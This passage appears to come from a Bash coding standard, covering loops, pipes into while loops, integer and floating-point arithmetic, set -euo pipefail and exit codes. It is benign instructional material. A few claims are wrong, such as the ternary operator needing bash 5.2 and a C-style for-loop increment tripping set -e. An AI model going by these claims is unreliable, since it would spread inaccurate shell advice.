for file in $(ls *.txt); do  # NEVER parse ls!
  process "$file"
done

# ✓ Correct - use glob directly
for file in *.txt; do
  process "$file"
done

# ✗ Wrong - pipe to while (subshell issue)
declare -i count=0
cat file.txt | while read -r line; do
  count+=1
done
echo "$count"  # Still 0!

# ✓ Correct - process substitution
declare -i count=0
while read -r line; do
  count+=1
done < <(cat file.txt)
echo "$count"  # Correct value

# ✗ Wrong - unquoted array in for loop
array=('item 1' 'item 2')
for item in ${array[@]}; do  # Unquoted!
  echo "$item"
done

# ✓ Correct - quoted array expansion
for item in "${array[@]}"; do
  echo "$item"
done

# ✗ Wrong - C-style loop with ++
for ((i=0; i<10; i++)); do  # Fails with set -e when i=0!
  echo "$i"
done

# ✓ Correct - use +=1 instead
for ((i=0; i<10; i+=1)); do
  echo "$i"
done

# ✗ Wrong - redundant comparison in arithmetic context
while (($# > 0)); do  # Nonsense: $# is already truthy when non-zero
  case $1 in
    --opt) shift ;;
  esac
  shift
done

# ✓ Correct - arithmetic context evaluates non-zero as true
while (($#)); do  # Clean and idiomatic
  case $1 in
    --opt) shift ;;
  esac
  shift
done

# ✗ Wrong - break with no argument (ambiguous in nested loops)
for i in {1..10}; do
  for j in {1..10}; do
    if ((i * j > 50)); then
      break  # Breaks inner loop only - unclear
    fi
  done
done

# ✓ Correct - explicit break level
for i in {1..10}; do
  for j in {1..10}; do
    if ((i * j > 50)); then
      break 2  # Break both loops - clear intent
    fi
  done
done

# ✗ Wrong - modifying array during iteration
array=(a b c d)
for item in "${array[@]}"; do
  array+=("$item")  # Dangerous - modifies array being iterated!
done

# ✓ Correct - create new array
original=(a b c d)
modified=()
for item in "${original[@]}"; do
  modified+=("$item" "$item")  # Safe - different array
done

# ✗ Wrong - seq for iteration (external command)
for i in $(seq 1 10); do  # Unnecessary external command
  echo "$i"
done

# ✓ Correct - use brace expansion
for i in {1..10}; do
  echo "$i"
done

# ✗ Wrong - reading file without preserving backslashes
while read line; do  # Missing -r flag
  echo "$line"
done < file.txt

# ✓ Correct - always use -r with read
while IFS= read -r line; do
  echo "$line"
done < file.txt

# ✗ Wrong - infinite loop without safety check
while ((1)); do
  process_item
  # No break condition - runs forever!
done

# ✓ Correct - infinite loop with exit condition (using fastest construct)
declare -i iteration=0
declare -i max_iterations=1000
while ((1)); do
  process_item

  iteration+=1
  if ((iteration >= max_iterations)); then
    warn 'Max iterations reached'
    break
  fi
done
```

**Edge cases:**

**1. Empty arrays:**

```bash
# Empty array is safe to iterate
empty=()

# Zero iterations - no errors
for item in "${empty[@]}"; do
  echo "$item"  # Never executes
done
```

**2. Arrays with empty elements:**

```bash
# Array with empty string element
array=('' 'item2' '' 'item4')

# Iterates 4 times, including empty strings
for item in "${array[@]}"; do
  echo "Item: [$item]"
done
# Output:
# Item: []
# Item: [item2]
# Item: []
# Item: [item4]
```

**3. Glob with no matches:**

```bash
# With nullglob enabled
shopt -s nullglob

for file in /nonexistent/*.txt; do
  echo "$file"  # Never executes if no matches
done

# Without nullglob
shopt -u nullglob

for file in /nonexistent/*.txt; do
  # Executes once with literal: /nonexistent/*.txt
  if [[ ! -e "$file" ]]; then
    echo 'No matches'
    break
  fi
  echo "$file"
done
```

**4. Loop variable scope:**

```bash
# Loop variables are not local
for i in {1..5}; do
  echo "$i"
done
echo "i is still available: $i"  # Prints: 5

# Make loop variable local explicitly if needed
process_items() {
  local -i i

  for i in {1..5}; do
    echo "$i"
  done
  # i goes out of scope here
}
```

**IMPORTANT: Declare local variables BEFORE loops, not inside:**

```bash
# ✓ CORRECT - declare locals before the loop
process_links() {
  local -- target
  local -i count=0

  for link in "$BIN_DIR"/*; do
    [[ -L "$link" ]] || continue
    target=$(readlink "$link")
    if [[ "$target" == "$INSTALL_DIR"/ok_master ]]; then
      rm -f "$link"
      count+=1
    fi
  done

  echo "Removed $count links"
}

# ✗ WRONG - declaring local inside loop
process_links_bad() {
  for link in "$BIN_DIR"/*; do
    [[ -L "$link" ]] || continue
    local target             # WRONG: re-declared each iteration
    target=$(readlink "$link")
    # ...
  done
}
```

**Why declare before loops:**
- `local` inside a loop doesn't create a new scope per iteration - it's the same variable
- Declaring inside loops is wasteful (re-executes `local` on each iteration)
- Misleading to readers (suggests new variable each time)
- Proper pattern: declare all locals at function start, then use in loops

**5. Reading empty files:**

```bash
# Empty file
touch empty.txt

declare -i count=0
while read -r line; do
  count+=1
done < empty.txt

echo "Count: $count"  # Output: 0 (zero iterations)
```

**Summary:**

- **For loops** - best for arrays, globs, and known ranges
- **While loops** - best for reading input, argument parsing, and condition-based iteration
- **Until loops** - rarely used, prefer while with opposite condition
- **Infinite loops** - use `while ((1))` for optimal performance, `while :` for POSIX compatibility, avoid `while true` (15-22% slower)
- **Always quote arrays** - `"${array[@]}"` for safe iteration
- **Use process substitution** - `< <(command)` to avoid subshell in while loops
- **Prefer arrays over strings** - for file lists and collections
- **Never parse ls** - use glob patterns or find with process substitution
- **Use i+=1 not i++** - ++ returns original value, fails with set -e when 0
- **Avoid redundant comparisons** - use `while (($#))` not `while (($# > 0))` in arithmetic context
- **Break and continue** - for early exit and conditional skipping
- **Specify break level** - `break 2` for nested loops
- **IFS= read -r** - always use with while loops reading input
- **Check glob matches** - with nullglob or explicit check

**Key principle:** Choose the loop type that matches your iteration pattern: for loops for collections and ranges, while loops for streaming input and conditions. Always prefer array iteration over string parsing, use process substitution to avoid subshell issues, and employ explicit loop control with break/continue for clarity. The loop type should make your intent immediately obvious to readers.


---


**Rule: BCS0504**

## Pipes to While Loops

**Avoid piping commands to while loops because pipes create subshells where variable assignments don't persist outside the loop. Use process substitution `< <(command)` or `readarray` instead. This is one of the most common and insidious bugs in Bash scripts.**

**Rationale:**

- **Variable Persistence**: Pipes create subshells; variables modified inside don't persist outside the loop
- **Debugging Difficulty**: The script appears to work but counters stay at 0, arrays stay empty
- **Silent Failure**: No error messages - script continues with wrong values
- **Process Substitution Fixes**: `< <(command)` runs loop in current shell, variables persist
- **Readarray Alternative**: For simple line collection, `readarray` is cleaner and faster
- **Set -e Interaction**: Failures in piped commands may not trigger `set -e` properly

**The subshell problem:**

When you pipe to while, Bash creates a subshell for the while loop. Any variable modifications happen in that subshell and are lost when the pipe ends.

```bash
# ✗ WRONG - Subshell loses variable changes
declare -i count=0

echo -e "line1\nline2\nline3" | while IFS= read -r line; do
  echo "$line"
  count+=1
done

echo "Count: $count"  # Output: Count: 0 (NOT 3!)
# Variable changes were lost!
```

**Why this happens:**

```bash
# Pipe creates process tree:
#   Parent shell (count=0)
#      |
#      └─> Subshell (while loop)
#            - Inherits count=0
#            - Modifies count (1, 2, 3)
#            - Subshell exits
#            - Changes discarded!
#      |
#   Back to parent (count still 0)
```

**Solution 1: Process substitution (most common)**

```bash
# ✓ CORRECT - Process substitution avoids subshell
declare -i count=0

while IFS= read -r line; do
  echo "$line"
  count+=1
done < <(echo -e "line1\nline2\nline3")

echo "Count: $count"  # Output: Count: 3 (correct!)
```

**Solution 2: Readarray/mapfile (when collecting lines)**

```bash
# ✓ CORRECT - readarray reads all lines into array
declare -a lines

readarray -t lines < <(echo -e "line1\nline2\nline3")

# Now process array
declare -i count="${#lines[@]}"
echo "Count: $count"  # Output: Count: 3 (correct!)

# Iterate if needed
local -- line
for line in "${lines[@]}"; do
  echo "$line"
done
```

**Solution 3: Here-string (for single variables)**

```bash
# ✓ CORRECT - Here-string when input is in variable
declare -- input=$'line1\nline2\nline3'
declare -i count=0

while IFS= read -r line; do
  echo "$line"
  count+=1
done <<< "$input"

echo "Count: $count"  # Output: Count: 3 (correct!)
```

**Complete examples:**

**Example 1: Counting matching lines**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✗ WRONG - Counter stays 0
count_errors_wrong() {
  local -- log_file=$1
  local -i error_count=0

  # Pipe creates subshell!
  grep 'ERROR' "$log_file" | while IFS= read -r line; do
    echo "Found: $line"
    error_count+=1
  done

  echo "Errors: $error_count"  # Always 0!
  return "$error_count"  # Returns 0 even if errors found!
}

# ✓ CORRECT - Process substitution
count_errors_correct() {
  local -- log_file=$1
  local -i error_count=0

  # Process substitution keeps loop in current shell
  while IFS= read -r line; do
    echo "Found: $line"
    error_count+=1
  done < <(grep 'ERROR' "$log_file")

  echo "Errors: $error_count"  # Correct count!
  return "$error_count"
}

# ✓ ALSO CORRECT - Using wc (when only count matters)
count_errors_simple() {
  local -- log_file=$1
  local -i error_count

  error_count=$(grep -c 'ERROR' "$log_file")
  echo "Errors: $error_count"
  return "$error_count"
}

main() {
  local -- test_log=/var/log/app.log

  count_errors_correct "$test_log"
}

main "$@"
#fin
```

**Example 2: Building array from command output**

```bash
# ✗ WRONG - Array stays empty
collect_users_wrong() {
  local -a users=()

  # Pipe creates subshell!
  getent passwd | while IFS=: read -r user _; do
    users+=("$user")
  done

  echo "Users: ${#users[@]}"  # Always 0!
  # Array modifications lost!
}

# ✓ CORRECT - Process substitution
collect_users_correct() {
  local -a users=()

  while IFS=: read -r user _; do
    users+=("$user")
  done < <(getent passwd)

  echo "Users: ${#users[@]}"  # Correct count!
  printf '%s\n' "${users[@]}"
}

# ✓ ALSO CORRECT - readarray (simpler)
collect_users_readarray() {
  local -a users

  # Read usernames directly into array
  readarray -t users < <(getent passwd | cut -d: -f1)

  echo "Users: ${#users[@]}"
  printf '%s\n' "${users[@]}"
}
```

**Example 3: Processing files with state**

```bash
# ✗ WRONG - State variables lost
process_files_wrong() {
  local -i total_size=0
  local -i file_count=0

  # Pipe creates subshell!
  find /data -type f | while IFS= read -r file; do
    local -- size
    size=$(stat -f%z "$file" 2>/dev/null || stat -c%s "$file" 2>/dev/null)
    total_size+=size
    file_count+=1
  done

  echo "Files: $file_count, Total: $total_size"
  # Both 0 - variables lost!
}

# ✓ CORRECT - Process substitution
process_files_correct() {
  local -i total_size=0
  local -i file_count=0

  local -- size
  while IFS= read -r file; do
    size=$(stat -f%z "$file" 2>/dev/null || stat -c%s "$file" 2>/dev/null)
    total_size+=size
    file_count+=1
  done < <(find /data -type f)

  echo "Files: $file_count, Total: $total_size"
  # Correct values!
}
```

**Example 4: Multi-variable read**

```bash
# ✗ WRONG - Associative array stays empty
parse_config_wrong() {
  local -A config=()

  # Pipe creates subshell!
  cat config.conf | while IFS='=' read -r key value; do
    config[$key]="$value"
  done

  # config is empty here!
  echo "Config entries: ${#config[@]}"  # 0
}

# ✓ CORRECT - Process substitution
parse_config_correct() {
  local -A config=()

  while IFS='=' read -r key value; do
    # Skip comments and empty lines
    [[ "$key" =~ ^[[:space:]]*# ]] && continue ||:
    [[ -n "$key" ]] || continue

    config[$key]="$value"
  done < <(cat config.conf)

  # config has values!
  echo "Config entries: ${#config[@]}"

  # Display config
  local -- k
  for k in "${!config[@]}"; do
    echo "$k = ${config[$k]}"
  done
}
```

**When readarray is better:**

```bash
# If you just need lines in an array, use readarray

# ✓ BEST - readarray for simple line collection
declare -a log_lines
readarray -t log_lines < <(tail -n 100 /var/log/app.log)

# Process array
local -- line
for line in "${log_lines[@]}"; do
  [[ "$line" =~ ERROR ]] && echo "Error: ${line@Q}" ||:
done

# ✓ BEST - readarray with null-delimited input
declare -a files
readarray -d '' -t files < <(find /data -type f -print0)

# Safe iteration (handles spaces in filenames)
local -- file
for file in "${files[@]}"; do
  echo "Processing: $file"
done
```

**Complete working example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Analyze log file with process substitution
analyze_log() {
  local -- log_file=$1

  local -i error_count=0
  local -i warn_count=0
  local -i total_lines=0
  local -a error_lines=()

  # Process substitution - variables persist
  while IFS= read -r line; do
    total_lines+=1

    if [[ "$line" =~ ERROR ]]; then
      error_count+=1
      error_lines+=("$line")
    elif [[ "$line" =~ WARN ]]; then
      warn_count+=1
    fi
  done < <(cat "$log_file")

  # All counters work correctly!
  echo "Analysis of $log_file:"
  echo "  Total lines: $total_lines"
  echo "  Errors: $error_count"
  echo "  Warnings: $warn_count"

  if ((error_count > 0)); then
    echo
    echo 'Error lines:'
    printf '  %s\n' "${error_lines[@]}"
  fi
}

# Collect configuration with readarray
load_config() {
  local -- config_file=$1
  local -a config_lines
  local -A config=()

  # Use readarray to collect lines
  readarray -t config_lines < <(grep -v '^#' "$config_file" | grep -v '^[[:space:]]*$')

  # Parse array
  local -- line key value
  for line in "${config_lines[@]}"; do
    IFS='=' read -r key value <<< "$line"
    config[$key]="$value"
  done

  # Config populated correctly
  echo "Configuration loaded: ${#config[@]} entries"
  local -- k
  for k in "${!config[@]}"; do
    echo "  $k = ${config[$k]}"
  done
}

# Process files safely
process_directory() {
  local -- dir=$1
  local -a files

  # Collect files with readarray
  readarray -d '' -t files < <(find "$dir" -type f -name '*.txt' -print0)

  local -- file
  local -i processed=0

  for file in "${files[@]}"; do
    echo "Processing: $file"
    # Process file
    processed+=1
  done

  echo "Processed $processed files"
}

main() {
  analyze_log '/var/log/app.log'
  load_config '/etc/app/config.conf'
  process_directory '/data'
}

main "$@"
#fin
```

**Anti-patterns to avoid:**

```bash
declare -i count=0
# ✗ WRONG - Pipe to while with counter
cat file.txt | while read -r line; do
  count+=1
done
echo "$count"  # Still 0!

# ✓ CORRECT - Process substitution
while read -r line; do
  count+=1
done < <(cat file.txt)
echo "$count"  # Correct!

# ✗ WRONG - Pipe to while building array
find /data -name '*.txt' | while read -r file; do
  files+=("$file")
done
echo "${#files[@]}"  # Still 0!

# ✓ CORRECT - readarray
readarray -d '' -t files < <(find /data -name '*.txt' -print0)
echo "${#files[@]}"  # Correct!

# ✗ WRONG - Pipe to while modifying associative array
cat config | while IFS='=' read -r key val; do
  config[$key]="$val"
done
# config is empty!

# ✓ CORRECT - Process substitution
while IFS='=' read -r key val; do
  config[$key]="$val"
done < <(cat config)
# config has values!

# ✗ WRONG - Setting flag in piped while
has_errors=0
grep ERROR log | while read -r line; do
  has_errors=1
done
echo "$has_errors"  # Still 0!

# ✓ CORRECT - Use return value or process substitution
if grep -q ERROR log; then
  has_errors=1
fi
# Or:
while read -r line; do
  has_errors=1
done < <(grep ERROR log)

# ✗ WRONG - Complex pipeline with state
cat file | grep pattern | sort | while read -r line; do
  count+=1
  data+=("$line")
done
# count=0, data=() - both lost!

# ✓ CORRECT - Process substitution with pipeline
while read -r line; do
  count+=1
  data+=("$line")
done < <(cat file | grep pattern | sort)
# Variables persist!
```

**Edge cases:**

**1. Empty input:**

```bash
# Process substitution handles empty input correctly
declare -i count=0

while read -r line; do
  count+=1
done < <(echo -n "")  # No output

echo "Count: $count"  # 0 - correct (no lines)
```

**2. Command failure in process substitution:**

```bash
# With set -e, command failure is detected
while read -r line; do
  process "$line"
done < <(failing_command)  # Script exits if failing_command fails
```

**3. Very large output:**

```bash
# readarray loads everything into memory
readarray -t lines < <(cat huge_file)  # Might use lots of RAM

# Process substitution processes line by line
while read -r line; do
  process "$line"  # Processes one at a time
done < <(cat huge_file)  # Lower memory usage
```

**4. Null-delimited input (filenames with newlines):**

```bash
# Use -d '' for null-delimited
while IFS= read -r -d '' file; do
  echo "File: $file"
done < <(find /data -print0)

# Or with readarray
readarray -d '' -t files < <(find /data -print0)
```

**Testing the subshell issue:**

```bash
# Demonstrate the problem
test_pipe_subshell() {
  local -i count=0

  # This fails
  echo "test" | while read -r line; do
    count=1
  done

  if ((count == 0)); then
    echo 'FAIL: Pipe created subshell, count not updated'
  else
    echo 'PASS: Count was updated'
  fi
}

# Demonstrate the solution
test_process_substitution() {
  local -i count=0

  # This works
  while read -r line; do
    count=1
  done < <(echo 'test')

  if ((count == 1)); then
    echo 'PASS: Process substitution kept variables'
  else
    echo 'FAIL: Count not updated'
  fi
}

test_pipe_subshell        # Shows the problem
test_process_substitution # Shows the solution
```

**Summary:**

- **Never pipe to while** - creates subshell, variables don't persist
- **Use process substitution** - `while read; done < <(command)` - variables persist
- **Use readarray** - `readarray -t array < <(command)` - simple and efficient
- **Use here-string** - `while read; done <<< "$var"` - when input is in variable
- **Subshell variables are lost** - any modifications disappear when pipe ends
- **Debugging is hard** - script appears to work but uses wrong values
- **Always test with data** - empty counters/arrays indicate subshell problem

**Key principle:** Piping to while is a dangerous anti-pattern that silently loses variable modifications. Always use process substitution `< <(command)` or `readarray` instead. This is not a style preference - it's about correctness. If you find `| while read` in code, it's almost certainly a bug waiting to manifest.


---


**Rule: BCS0505**

## Arithmetic Operations

> **See Also:** BCS0201 for complete guidance on declaring integer variables with `declare -i`

**Declare integer variables explicitly:**

```bash
# Always declare integer variables with -i flag
declare -i i j result count total

# Or declare with initial value
declare -i counter=0
declare -i max_retries=3
```

**Rationale for `declare -i`:**
- **Automatic arithmetic context**: All assignments become arithmetic (no need for `$(())`)
- **Type safety**: Helps catch errors when non-numeric values assigned
- **Performance**: Slightly faster for repeated arithmetic operations
- **Clarity**: Signals to readers that variable holds numeric values
- **Required for BCS compliance**: ALL integer variables must use `declare -i` (BCS0201)

**Increment operations:**

```bash
# ✓ CORRECT - The ONLY acceptable increment form
declare -i i=0    # MUST declare as integer first
i+=1              # Clearest, safest, most readable

# ✗ WRONG - NEVER use these increment forms
((i+=1))          # NEVER - does not fail with set -e, but (()) is unnecessary
((i++))           # NEVER - returns old value, fails with set -e when i=0
((++i))           # NEVER - unnecessary complexity, use i+=1 instead
i++               # NEVER - syntax error outside arithmetic context
```

**Critical rule:** Use `i+=1` for ALL increments. This requires the variable to be declared with `declare -i` or `local -i` first. The `(())` construct is unnecessary for simple increments when the variable is typed as integer.

**Why only `i+=1`:**
1. **Requires `declare -i`**: Forces proper integer declaration (BCS0201)
2. **Always succeeds**: No risk of `set -e` exit
3. **Self-documenting**: Clear intent, no C-style confusion
4. **Simpler**: No need for `(())` wrapper

**Why `((i++))` is dangerous:**

```bash
#!/usr/bin/env bash
set -e  # Exit on error

i=0
((i++))  # Returns 0 (the old value), which is "false"
         # Script exits here with set -e!
         # i now equals 1, but we never reach next line

echo "This never executes"
```

**Safe demonstration:**

```bash
#!/usr/bin/env bash
set -e
declare -i i j k

# ✓ Safe patterns
i=0
i+=1      # i=1, no exit
echo "i=$i"

j=0
((++j))   # j=1, returns 1 (true), no exit
echo "j=$j"

k=0
((k+=1))  # k=1, returns 0 (always success), no exit
echo "k=$k"
```

**Arithmetic expressions:**

```bash
# In (()) - no $ needed for variables
((result = x * y + z))
((i = j * 2 + 5))
((total = sum / count))

# With $(()), for use in assignments or commands
result=$((x * y + z))
echo "$((i * 2 + 5))"
args=($((count - 1)))  # In array context
```

**Arithmetic operators:**

| Operator | Meaning | Example |
|----------|---------|---------|
| `+` | Addition | `i=a+b` |
| `-` | Subtraction | `((i = a - b))` |
| `*` | Multiplication | `((i = a * b))` |
| `/` | Integer division | `((i = a / b))` |
| `%` | Modulo (remainder) | `((i = a % b))` |
| `**` | Exponentiation | `((i = a ** b))` |
| `++` / `--` | Increment/Decrement | Use `i+=1` instead |
| `+=` / `-=` | Compound assignment | `i+=5` |

**Arithmetic conditionals:**

```bash
# Use (()) for arithmetic comparisons
if ((i < j)); then
  echo 'i is less than j'
fi

((count)) && process_items
((attempts >= max_retries)) && die 1 'Too many attempts'

# All C-style operators work
((i >= 10)) && echo 'Ten or more'
((i <= 5)) || echo 'More than five'
((i == j)) && echo 'Equal'
((i != j)) && echo 'Not equal'
```

**Comparison operators in (()):**

| Operator | Meaning |
|----------|---------|
| `<` | Less than |
| `<=` | Less than or equal |
| `>` | Greater than |
| `>=` | Greater than or equal |
| `==` | Equal |
| `!=` | Not equal |

**Arithmetic truthiness:**

In arithmetic context, non-zero is truthy. Use this directly instead of explicit comparisons:

```bash
# ✓ CORRECT - use truthiness directly
declare -i count=5
if ((count)); then echo 'Has items'; fi
((VERBOSE)) && echo 'Verbose mode enabled'
((DRY_RUN)) || execute_command

# ✗ WRONG - redundant comparison
if ((count > 0)); then echo 'Has items'; fi
if ((VERBOSE == 1)); then echo 'Verbose mode'; fi
((DRY_RUN != 0)) || execute_command
```

**Why use truthiness:**
- **Cleaner code**: `((var))` is simpler than `((var > 0))`
- **Boolean intent**: Makes flag/toggle usage obvious
- **Consistent pattern**: Same as C/shell idioms

**Complex expressions:**

```bash
# Parentheses for grouping
((result = (a + b) * (c - d)))

# Multiple operations
((total = sum + count * average / 2))

# Ternary operator (bash 5.2+)
((max = a > b ? a : b))

# Bitwise operations
((flags = flag1 | flag2))  # Bitwise OR
((masked = value & 0xFF))  # Bitwise AND
```

**Anti-patterns to avoid:**

### Using Test Command for Arithmetic Comparisons

**The Problem:** Using `[[ ... -eq ... ]]` for integer comparisons is verbose and old-style.

```bash
# ✗ WRONG - Using [[ ]] for integer comparison
if [[ "$exit_code" -eq 0 ]]; then
  echo 'Success'
fi

# ✗ WRONG - Requires quotes and verbose syntax
[[ "$count" -gt 10 ]] && process_items

# ✗ WRONG - Multiple integer comparisons with [[ ]]
[[ "$exit_code" -eq 0 || "$exit_code" -eq 141 ]] && handle_success

# ✓ CORRECT - Use (()) for integer comparison
if ((exit_code == 0)); then
  echo 'Success'
fi

# ✓ CORRECT - Clean arithmetic syntax, no quotes needed
((count > 10)) && process_items ||:

# ✓ CORRECT - Multiple integer comparisons
((exit_code == 0 || exit_code == 141)) && handle_success
```

**Why `(())` is better:**
- **No quoting required**: Variables don't need quotes in arithmetic context
- **Native operators**: Use `>`, `<`, `==`, `!=` instead of `-gt`, `-lt`, `-eq`, `-ne`
- **More readable**: Looks like arithmetic, not string comparison
- **Faster**: No external test command, pure bash arithmetic
- **Type-safe**: Works with integers declared using `declare -i`

**Important:** Always declare integer variables with `declare -i` first (see BCS0201)

```bash
# Complete pattern (BCS-compliant)
declare -i exit_code=0
some_command || exit_code=$?

if ((exit_code == 0)); then
  echo 'Command succeeded'
else
  echo "Command failed with exit code: $exit_code"
fi
```

### Other Common Anti-Patterns

```bash
# ✗ Wrong - using [[ ]] for arithmetic
[[ "$count" -gt 10 ]]  # Verbose, old-style

# ✓ Correct - use (())
((count > 10))

# ✗ Wrong - post-increment
((i++))  # Dangerous with set -e when i=0

# ✗ Wrong - unnecessary (())
((i+=1))

# ✓ Correct - use +=1
i+=1

# ✗ Wrong - expr command (slow, external)
result=$(expr $i + $j)

# ✓ Correct - use $(()) or (())
result=$((i + j))
((result = i + j))

# ✗ Wrong - $ inside (()) on left side
((result = $i + $j))  # Unnecessary $

# ✓ Correct - no $ inside (())
((result = i + j))

# ✗ Wrong - quotes around arithmetic
result="$((i + j))"  # Unnecessary quotes

# ✓ Correct - no quotes needed
result=$((i + j))
```

**Integer division gotcha:**

```bash
# Integer division truncates (rounds toward zero)
((result = 10 / 3))  # result=3, not 3.333...
((result = -10 / 3)) # result=-3, not -3.333...

# For floating point, use bc or awk
result=$(bc <<< "scale=2; 10 / 3")  # result=3.33
result=$(awk 'BEGIN {print 10/3}')   # result=3.33333
```

**Practical examples:**

```bash
# Loop counter
declare -i i
for ((i=0; i<10; i+=1)); do
  echo "Iteration $i"
done

# Retry logic
declare -i attempts=0
declare -i max_attempts=5
while ((attempts < max_attempts)); do
  if process_item; then
    break
  fi
  attempts+=1
  ((attempts > max_attempts)) || sleep 1
done
((attempts < max_attempts)) || die 1 'Max attempts reached'

# Percentage calculation
declare -i total=100
declare -i completed=37
declare -i percentage=$((completed * 100 / total))
echo "Progress: $percentage%"
```


---


**Rule: BCS0506**

### Floating-Point Operations

**Rule: BCS0706** (New)

Performing floating-point arithmetic in Bash using external tools.

---

#### Rationale

Bash only supports integer arithmetic natively. For floating-point:
- Use `bc` for arbitrary precision calculations
- Use `awk` for inline floating-point operations
- Use `printf` for formatting floating-point output
- Avoid complex floating-point logic in Bash when possible

---

#### Using bc (Basic Calculator)

```bash
# Simple calculation
result=$(echo '3.14 * 2.5' | bc -l)

# With variables
declare -- width='10.5'
declare -- height='7.25'
area=$(echo "$width * $height" | bc -l)

# Set precision (scale)
pi=$(echo 'scale=10; 4*a(1)' | bc -l)  # Pi to 10 decimal places

# Comparison (bc returns 1 for true, 0 for false)
if (($(echo "$a > $b" | bc -l))); then
  info "$a is greater than $b"
fi
```

#### Using awk

```bash
# Inline calculation
result=$(awk "BEGIN {printf \"%.2f\", 3.14 * 2.5}")

# With variables
area=$(awk -v w="$width" -v h="$height" 'BEGIN {printf "%.2f", w * h}')

# Comparison
if awk -v a="$a" -v b="$b" 'BEGIN {exit !(a > b)}'; then
  info "$a is greater than $b"
fi

# Percentage calculation
pct=$(awk -v used="$used" -v total="$total" 'BEGIN {printf "%.1f", used/total*100}')
```

#### Using printf for Formatting

```bash
# Format existing float
printf '%.2f\n' "$value"

# Format calculation result
printf 'Area: %.2f sq units\n' "$(echo "$w * $h" | bc -l)"
```

#### Common Patterns

```bash
# Human-readable byte sizes
bytes_to_human() {
  local -i bytes=$1
  if ((bytes >= 1073741824)); then
    awk -v b="$bytes" 'BEGIN {printf "%.1fG", b/1073741824}'
  elif ((bytes >= 1048576)); then
    awk -v b="$bytes" 'BEGIN {printf "%.1fM", b/1048576}'
  elif ((bytes >= 1024)); then
    awk -v b="$bytes" 'BEGIN {printf "%.1fK", b/1024}'
  else
    echo "${bytes}B"
  fi
}

# Percentage with rounding
calc_percentage() {
  local -i part=$1 total=$2
  awk -v p="$part" -v t="$total" 'BEGIN {printf "%.0f", p/t*100}'
}
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - Bash integer division loses precision
result=$((10 / 3))  # Returns 3, not 3.333

# ✓ Correct - use bc for float division
result=$(echo '10 / 3' | bc -l)  # Returns 3.333...
```

```bash
# ✗ Wrong - comparing floats as strings
if [[ "$a" > "$b" ]]; then  # String comparison!

# ✓ Correct - use bc or awk for numeric comparison
if (($(echo "$a > $b" | bc -l))); then
```

---

**See Also:** BCS0705 (Integer Arithmetic)

**Full implementation:** See `examples/exemplar-code/hr2int` and `examples/exemplar-code/int2hr`


---


**Rule: BCS0600**

# Error Handling

This consolidated section establishes comprehensive error handling practices for robust scripts. It mandates `set -euo pipefail` (with strongly recommended `shopt -s inherit_errexit`) for automatic error detection, defines standard exit code conventions (0=success, 1=general error, 2=misuse, 5=IO error, 22=invalid argument, etc.), explains trap handling for cleanup operations, details proper return value checking patterns, and clarifies when and how to safely suppress errors (using `|| true`, `|| :`, or conditional checks). Error handling must be configured before any other commands run to catch failures early.


---


**Rule: BCS0601**

## Exit on Error
```bash
set -euo pipefail
# -e: Exit on command failure
# -u: Exit on undefined variable
# -o pipefail: Exit on pipe failure
```

**Detailed explanation:**

- **`set -e`** (errexit): Script exits immediately if any command returns non-zero
- **`set -u`** (nounset): Exit if referencing undefined variables
- **`set -o pipefail`**: Pipeline fails if any command in pipe fails (not just last)

**Rationale:** These flags turn Bash from "permissive" to "strict mode":
- Catches errors immediately instead of continuing with bad state
- Prevents cascading failures
- Makes scripts behave more like compiled languages

**Common patterns for handling expected failures:**

```bash
# Pattern 1: Allow specific command to fail
command_that_might_fail || true

# Pattern 2: Capture exit code
if command_that_might_fail; then
  echo 'Success'
else
  echo 'Expected failure occurred'
fi

# Pattern 3: Temporarily disable errexit
set +e
risky_command
set -e

# Pattern 4: Check if variable exists before using
if [[ -n "${OPTIONAL_VAR:-}" ]]; then
  echo "Variable is set: $OPTIONAL_VAR"
fi
```

**Important gotchas:**

```bash
# ✗ This will exit even though you check the result
result=$(failing_command)  # Script exits here with set -e
if [[ -n "$result" ]]; then  # Never reached
  echo 'Never gets here'
fi

# ✓ Correct - disable errexit for this command
set +e
result=$(failing_command)
set -e
if [[ -n "$result" ]]; then
  echo 'Now this works'
fi

# ✓ Alternative - check in conditional
if result=$(failing_command); then
  echo "Command succeeded: $result"
else
  echo 'Command failed, that's okay'
fi
```

**When to disable these flags:**
- Interactive scripts where user errors should be recoverable
- Scripts that intentionally try multiple approaches
- During cleanup operations that might fail

**Best practice:** Keep them enabled for most scripts. Disable only when absolutely necessary and re-enable immediately after.


---


**Rule: BCS0602**

## Exit Codes

Exit codes provide consistent error reporting across scripts. This is a **reference guide** - use integers directly or define constants as needed.

### Standard `die()` Function

```bash
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
```

**Usage patterns:**
```bash
# Direct integer (simplest)
die 3 'File not found'
die 22 'Invalid argument'

# With constants (clearer intent)
declare -i ERR_NOENT=3
die "$ERR_NOENT" "Config file not found ${file@Q}"
```

---

### BCS Canonical Exit Codes

#### Success

| Code | Name | Description |
|------|------|-------------|
| 0 | SUCCESS | Successful termination |

#### Core Errors (Bash convention)

| Code | Name | Description |
|------|------|-------------|
| 1 | ERR_GENERAL | General/unspecified error (catchall) |
| 2 | ERR_USAGE | Command line usage error |

#### File Operations

| Code | Name | Description | errno |
|------|------|-------------|-------|
| 3 | ERR_NOENT | No such file or directory | ENOENT=2 |
| 4 | ERR_ISDIR | Is a directory (expected file) | EISDIR=21 |
| 5 | ERR_IO | I/O error | EIO=5 |
| 6 | ERR_NOTDIR | Not a directory (expected dir) | ENOTDIR=20 |
| 7 | ERR_EMPTY | File/input is empty | - |

#### Arguments & Validation

| Code | Name | Description | errno |
|------|------|-------------|-------|
| 8 | ERR_REQUIRED | Required argument missing | - |
| 9 | ERR_RANGE | Value out of range | ERANGE=34 |
| 10 | ERR_TYPE | Wrong type/format | - |
| 22 | ERR_INVAL | Invalid argument | EINVAL=22 |

#### Permissions

| Code | Name | Description | errno |
